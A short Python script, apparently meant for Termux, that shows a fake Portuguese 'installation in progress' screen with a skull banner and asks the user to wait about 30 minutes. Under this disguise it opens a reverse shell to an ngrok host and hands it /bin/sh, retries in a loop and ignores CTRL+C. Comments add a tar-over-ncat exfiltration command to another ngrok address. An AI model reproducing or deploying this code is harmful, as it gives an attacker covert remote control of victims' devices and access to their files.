# -*- coding: UTF-8 -*-

#Tabela de cores ANSI
white = '\033[1;97m'
black = '\033[1;30m'
red = '\033[1;31m'
green = '\033[1;32m'
yellow = '\033[1;33m'
blue = '\033[1;34m'
redf = '\033[1;91m'
yellowf = '\033[1;93m'
yellowb = '\033[1;33m'
blueb = '\033[1;44m'
redfb = '\033[1;101m'
greenb = '\033[1;42m'
yellowfb = '\033[1;101m'
blackb = '\033[1;40m'
redb = '\033[1;41m'
negrito = '\033[;1m	'
reset = '\033[0;0m'

# Vars
back = False

# tar czp /pastes | ncat 4.tcp.ngrok.io 10624
# nc -lvp 333 | tar zxv

# Libs
import socket, subprocess, os

while (back == False):
    print(f'''{red}
                        ______
                     .-"      "-.
                    /            |
                   |              |
                   |,  .-.  .-.  ,|
                   | )(_o/  \o_)( |
                   |/     /\     \|
         (@_       (_     ^^     _) Installing...
    _     ) \_______\__|IIIIII|__/__________________________
   (_)@8@8$3<________|-\IIIIII/-|___________________________>
          )_/        \          /
         (@           `--------`

                {blue}━━━ {red}By Mayteer'Maker {blue}━━━

    {green}<--> Aguarde enquanto fazemos a instalação!...
    
    Por conta de ser uma ferramenta vasta de opções, o processo
    de download pode demorar.
    (Estima-se que em torno de 30 minutos)

    Lembre-se de dar permissão de memória ao termux, sem isso
    o processo de instalação será infinito!
    {white}
    [Aguarde...] > ''')

    try:
        # Tá aqui por quê? Não explana...🤫

        #Tool para gerenciar maquina (opcional & beta)
        #os.system('git clone https://github.com/xRev3rse/RMMtool &> /dev/null')

        #Payload > Shell Remota
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
        s.connect(("2.tcp.ngrok.io",14898))
        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
        subprocess.call(["/bin/sh","-i"])
    
    # Burlar CTRL+C
    except KeyboardInterrupt: 
        pass 
